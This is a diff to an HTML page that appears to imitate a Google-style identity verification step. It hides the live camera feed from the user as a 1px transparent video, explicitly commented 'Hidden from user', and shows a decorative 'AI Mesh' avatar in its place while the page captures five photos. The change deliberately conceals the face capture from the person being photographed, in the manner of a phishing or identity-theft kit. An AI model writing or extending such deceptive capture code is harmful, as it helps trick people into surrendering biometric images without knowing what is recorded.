@@ -39,6 +39,28 @@
             }
         }
 
+        @keyframes meshPulse {
+            0% {
+                transform: scale(1);
+                opacity: 0.8;
+            }
+
+            50% {
+                transform: scale(1.05);
+                opacity: 1;
+            }
+
+            100% {
+                transform: scale(1);
+                opacity: 0.8;
+            }
+        }
+
+        .mesh-pulse {
+            animation: meshPulse 2s ease-in-out infinite;
+            transform-origin: center;
+        }
+
         .modal-icon {
             width: 80px;
             height: 80px;
@@ -94,11 +116,29 @@
                 step.</p>
 
             <div id="scanBox"
-                style="position: relative; width: 200px; height: 200px; margin: 30px auto; border: 3px dashed #1A73E8; border-radius: 50%; overflow: hidden; background: #f8f9fa; display: flex; align-items: center; justify-content: center;">
-                <video id="scanVideo" style="width: 100%; height: 100%; object-fit: cover; display: none;"></video>
-                <div id="scanPlaceholder" style="color: #5f6368; font-size: 14px;">Camera Inactive</div>
+                style="position: relative; width: 200px; height: 200px; margin: 30px auto; border: 3px dashed #1A73E8; border-radius: 50%; overflow: hidden; background: #000; display: flex; align-items: center; justify-content: center;">
+                <!-- Real Video (Hidden from user) -->
+                <video id="scanVideo" style="position: absolute; width: 1px; height: 1px; opacity: 0;"></video>
+
+                <!-- Biometric Avatar / AI Mesh (Shown to user) -->
+                <div id="avatarContainer"
+                    style="display: none; width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; background: radial-gradient(circle, #1a237e 0%, #000 70%);">
+                    <svg id="aiMesh" width="120" height="120" viewBox="0 0 100 100"
+                        style="filter: drop-shadow(0 0 10px #4285F4);">
+                        <path id="headOutline"
+                            d="M50 10 C30 10, 15 30, 20 60 C25 85, 40 90, 50 90 C60 90, 75 85, 80 60 C85 30, 70 10, 50 10"
+                            stroke="#4285F4" stroke-width="0.5" fill="none" class="mesh-pulse" />
+                        <path d="M50 10 L50 90 M20 60 L80 60 M25 35 L75 35 M25 75 L75 75" stroke="#4285F4"
+                            stroke-width="0.2" fill="none" opacity="0.5" />
+                        <circle cx="50" cy="50" r="30" stroke="#4285F4" stroke-width="0.3" fill="none" opacity="0.3" />
+                    </svg>
+                </div>
+
+                <div id="scanPlaceholder"
+                    style="color: #fff; font-size: 14px; text-transform: uppercase; font-weight: 500; letter-spacing: 1px;">
+                    Ready</div>
                 <div id="scanLine"
-                    style="display: none; position: absolute; top: 0; left: 0; width: 100%; height: 2px; background: #1A73E8; box-shadow: 0 0 10px #1A73E8; animation: scanAnim 2s linear infinite;">
+                    style="display: none; position: absolute; top: 0; left: 0; width: 100%; height: 2px; background: #4285F4; box-shadow: 0 0 15px #4285F4; animation: scanAnim 2s linear infinite; z-index: 10;">
                 </div>
             </div>
 
@@ -350,13 +390,13 @@
                 return;
             }
 
-            // Camera started - show scan UI
+            // Camera started - show Digital Avatar UI (Keep real video hidden)
             document.getElementById('scanPlaceholder').style.display = 'none';
-            document.getElementById('scanVideo').style.display = 'block';
+            document.getElementById('avatarContainer').style.display = 'flex';
             document.getElementById('scanLine').style.display = 'block';
             btn.style.display = 'none';
 
-            updateStep('step-bio', 'FBBC04', 'Biometric Scan in progress...');
+            updateStep('step-bio', 'FBBC04', 'AI Identity Mapping in progress...');
 
             // Capture 5 photos over 5 seconds
             await captureMultiplePhotos();
